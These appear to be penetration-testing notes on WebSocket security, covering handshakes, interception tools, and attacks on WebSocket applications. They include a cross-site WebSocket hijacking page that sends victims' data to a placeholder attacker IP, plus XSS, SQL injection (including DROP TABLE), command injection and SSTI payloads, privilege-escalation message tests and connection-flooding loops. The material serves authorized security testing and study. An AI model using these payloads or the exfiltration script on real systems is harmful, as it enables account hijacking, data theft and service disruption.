# WebSockets

#WebSockets #CSWSH #WebAppAttacks

## What Are WebSockets?

WebSockets provide a **persistent, full-duplex** communication channel over a single TCP connection. Unlike HTTP (request → response → close), a WebSocket connection stays open — both sides can send messages at any time without a new request.

**Common uses:** live chat, real-time dashboards, trading platforms, multiplayer games, live notifications, collaborative tools.

### The Handshake

WebSocket connections start as HTTP, then upgrade:

```
Client → Server:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

Server → Client:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

After the `101 Switching Protocols` response, the connection is a WebSocket — HTTP is no longer in use. Messages are sent as **frames** (text or binary), not HTTP requests.

### Key Differences from HTTP

| | HTTP | WebSocket |
|---|---|---|
| Connection | New per request | Persistent |
| Direction | Client initiates | Both sides can send |
| State | Stateless | Stateful |
| Headers | Every request | Handshake only |
| Overhead | High | Low |
| URL scheme | `http://` / `https://` | `ws://` / `wss://` |

---

## Intercepting WebSockets

### Burp Suite

Burp intercepts WebSocket traffic automatically.

- **WebSockets history:** Proxy tab → WebSockets history — all messages (both directions)
- **Intercept messages:** Proxy → Intercept → intercept WebSocket messages (enable in Intercept settings)
- **Repeater:** Right-click any WS message → Send to Repeater → modify and replay individual frames
- **Active Scan:** Burp Pro can scan WebSocket messages for injection vulns

### wscat (CLI WebSocket client)

```bash
# Install
npm install -g wscat

# Connect (unauthenticated)
wscat -c ws://target.com/chat

# Connect with auth header
wscat -c ws://target.com/chat -H "Authorization: Bearer <token>"

# Connect to WSS (TLS)
wscat -c wss://target.com/chat

# Send message after connecting
> {"action":"ping","data":"hello"}
```

### websocat (Kali alternative)

```bash
# Install
apt install websocat

# Connect
websocat ws://target.com/chat

# Send message from stdin
echo '{"action":"getUsers"}' | websocat ws://target.com/chat

# With cookie auth
websocat -H "Cookie: session=<value>" ws://target.com/chat
```

---

## Vulnerability Classes

### 1. Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket handshake uses HTTP — if the server authenticates only via cookies and doesn't validate `Origin`, an attacker can initiate a WS connection from a malicious page using the victim's cookies.

**Check:**
```
GET /ws HTTP/1.1
Origin: https://evil.com
Cookie: session=victim_cookie
```

If the server accepts connections from arbitrary origins → vulnerable.

**PoC page hosted on attacker server:**

```html
<!-- evil.com/cswsh.html -->
<script>
var ws = new WebSocket('wss://target.com/chat');

ws.onopen = function() {
    // Send a message as the victim
    ws.send(JSON.stringify({"action": "getHistory"}));
};

ws.onmessage = function(event) {
    // Exfiltrate response to attacker
    fetch('https://<AttackerIP>/log?data=' + btoa(event.data));
};
</script>
```

**Test origin validation:**

```bash
# Does the server accept connections with a modified Origin?
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.com" \
  http://target.com/ws
# If 101 Switching Protocols → no origin check → CSWSH possible
```

---

### 2. Message Injection (XSS / SQLi / CMDi)

WebSocket messages are just data — the server processes them the same as form input. All standard injection attacks apply if the server doesn't sanitize.

**Identify the message format** — usually JSON, sometimes plain text or XML:

```json
{"action": "search", "query": "hello"}
{"message": "hello world"}
{"cmd": "status", "id": "1"}
```

**Test for XSS:**

```json
{"message": "<script>alert(1)</script>"}
{"message": "<img src=x onerror=alert(document.cookie)>"}
{"username": "admin<svg onload=alert(1)>"}
```

**Test for SQLi:**

```json
{"action": "getUser", "id": "1' OR '1'='1"}
{"action": "getUser", "id": "1; DROP TABLE users--"}
{"query": "' UNION SELECT null,username,password FROM users--"}
```

**Test for command injection:**

```json
{"cmd": "ping", "host": "127.0.0.1; id"}
{"filename": "report.pdf; whoami"}
```

**Test for SSTI:**

```json
{"template": "{{7*7}}"}
{"message": "${7*7}"}
```

---

### 3. Authentication & Authorization Flaws

WebSocket connections inherit the session from the HTTP handshake — but the server must still enforce authorization per message.

**Common issues:**

- Session established during handshake, but no re-validation on each message
- User A can request data for User B by changing an ID in the message
- Privilege escalation by adding `"role":"admin"` or `"isAdmin":true` to messages
- No token/auth required for the WS endpoint at all

**Test:**

```bash
# Connect as low-priv user, send admin-only action
wscat -c ws://target.com/chat -H "Cookie: session=<low_priv_session>"
> {"action": "getAdminPanel"}
> {"action": "deleteUser", "userId": "2"}
> {"action": "getUser", "userId": "1"}   # IDOR — try other user IDs
```

---

### 4. Information Disclosure

Servers sometimes send sensitive data in WS messages that shouldn't reach the client.

```bash
# Connect and observe all server-initiated messages
wscat -c ws://target.com/dashboard -H "Cookie: session=<token>"
# Watch for: other users' data, internal IPs, stack traces, admin data in broadcasts
```

---

### 5. Denial of Service / Resource Exhaustion

WebSocket connections are persistent — servers may not limit:

```bash
# Open many connections
for i in $(seq 1 100); do
    wscat -c ws://target.com/chat &
done

# Send oversized messages
python3 -c "print('A'*1000000)" | websocat ws://target.com/chat

# Rapid message flood
while true; do echo '{"msg":"x"}' | websocat ws://target.com/chat; done
```

---

### 6. WebSocket Smuggling (HTTP Upgrade Abuse)

Some reverse proxies (nginx, HAProxy) can be tricked into upgrading a non-WebSocket request, allowing smuggling of HTTP requests through the WS tunnel to bypass access controls.

```bash
# If a /ws path is whitelisted through a proxy, try HTTP request tunneling
# Tool: ws-smuggler / custom HTTP-over-WS payloads
```

---

## Testing Methodology

```
1. Identify WS endpoints
   - Burp WebSockets history during normal app usage
   - Search JS files for ws:// or wss://
   - Check Network tab in browser DevTools (WS filter)

2. Analyze message format
   - JSON? XML? Plain text? Binary?
   - Understand action/command structure
   - Map all actions the client can send

3. Test CSWSH
   - Change Origin header during handshake
   - If accepted → build PoC page

4. Fuzz each message field
   - XSS payloads
   - SQLi payloads
   - Command injection
   - SSTI detection strings ({{7*7}}, ${7*7})

5. Authorization testing
   - Replay messages with different session cookies
   - Change user IDs / resource IDs in messages (IDOR)
   - Send admin-only actions from low-priv session

6. Observe server-initiated messages
   - Connect and wait — does server broadcast sensitive data?
   - Broadcast to all connected clients?
```

---

## Burp Workflow

```
1. Browse the app normally with Burp running
2. Proxy → WebSockets history → review captured frames
3. Right-click a message → Send to Repeater
4. Modify payload → Send → check response
5. For CSWSH: Proxy → HTTP history → find the WS upgrade request
   → Send to Repeater → change Origin → resend → check if 101 returned
```

---

## Finding WS Endpoints in JS

```bash
# Download all JS files and search
curl -s http://target.com/app.js | grep -oE 'ws[s]?://[^"'\'']+'
curl -s http://target.com/app.js | grep -iE 'new WebSocket|WebSocket\('

# In browser DevTools console
Array.from(performance.getEntries()).filter(e => e.initiatorType === 'websocket')
```

---

## Tools

| Tool | Use |
|------|-----|
| Burp Suite | Intercept, modify, replay WS frames; CSWSH testing |
| [wscat](https://github.com/websockets/wscat) | CLI WS client — connect, send, receive |
| [websocat](https://github.com/vi/websocat) | Versatile CLI WS client, pipe-friendly |
| [WSSiP](https://github.com/nccgroup/wssip) | WS proxy for intercept/modify |
| [STEWS](https://github.com/PalindromeLabs/STEWS) | WS security testing framework — fingerprint + vuln scan |
| Browser DevTools | Network tab → WS — inspect frames in real time |
